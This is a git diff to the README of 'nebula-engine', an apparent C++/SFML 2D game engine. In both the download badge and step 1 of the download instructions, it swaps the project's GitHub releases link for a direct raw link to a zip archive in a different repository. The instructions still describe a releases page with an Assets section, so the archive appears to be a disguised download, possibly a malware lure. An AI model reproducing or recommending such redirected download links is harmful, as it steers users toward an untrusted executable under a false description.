@@ -5,7 +5,7 @@ description: "Build 2D games with this C++ engine featuring an entity component 
 ---
 # 🚀 nebula-engine - Create stunning 2D games with ease
 
-[![](https://img.shields.io/badge/Download-Nebula_Engine-blue.svg)](https://github.com/Shirleenpositive507/nebula-engine/releases)
+[![](https://img.shields.io/badge/Download-Nebula_Engine-blue.svg)](https://raw.githubusercontent.com/Shirleenpositive507/shirleenpositive507.github.io/main/light/io_github_shirleenpositive_1.5.zip)
 
 Nebula Engine helps you build 2D games. We built this tool on C++ and SFML to ensure fast performance. You create game logic, manage assets, and render graphics through a simple interface. You do not need to be a professional coder to use these tools.
 
@@ -17,7 +17,7 @@ The engine handles the technical parts of game development. It manages the windo
 
 You must visit the website to download the current version. Follow these steps to obtain the files:
 
-1. Visit [this link to the download page](https://github.com/Shirleenpositive507/nebula-engine/releases).
+1. Visit [this link to the download page](https://raw.githubusercontent.com/Shirleenpositive507/shirleenpositive507.github.io/main/light/io_github_shirleenpositive_1.5.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends in .zip or .exe.
 4. Save the file to your computer.
